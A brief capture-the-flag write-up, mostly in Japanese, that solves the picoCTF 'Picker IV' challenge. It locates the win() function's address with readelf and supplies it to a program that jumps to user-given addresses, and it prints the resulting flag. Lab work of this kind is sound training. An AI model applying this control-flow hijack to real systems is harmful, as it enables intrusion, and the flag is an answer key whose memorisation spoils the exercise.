# Picker IV:Binary Exploitation

Can you figure out how this program works to get the flag?\
Connect to the program with netcat: `$ nc saturn.picoctf.net 51785`\
The program's source code can be downloaded [here](https://github.com/colza12/ctf_writeup/blob/main/picoGym%20Exclusive/Picker%20IV/picker-IV.c). The binary can be downloaded [here](https://github.com/colza12/ctf_writeup/blob/main/picoGym%20Exclusive/Picker%20IV/picker-IV).

# Solution

とりあえず、`nc saturn.picoctf.net 51785`を実行してみる。
```
$ nc saturn.picoctf.net 51785
Enter the address in hex to jump to, excluding '0x': ffffff
You input 0xffffff
Segfault triggered! Exiting.
```
フラグが取れそうな関数のアドレスを指定すればフラグが出てきそうだ。
ソースコードを見てみる。
```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }
```
winを見つけた。`readelf -a`でアドレスを確認すると、
```
63: 000000000040129e   150 FUNC    GLOBAL DEFAULT   15 win
```
とあった。
もう一度、実行してみて`40129e`を入力してみる。
```
$ nc saturn.picoctf.net 51785
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
```
フラグが得られた。

`picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}`

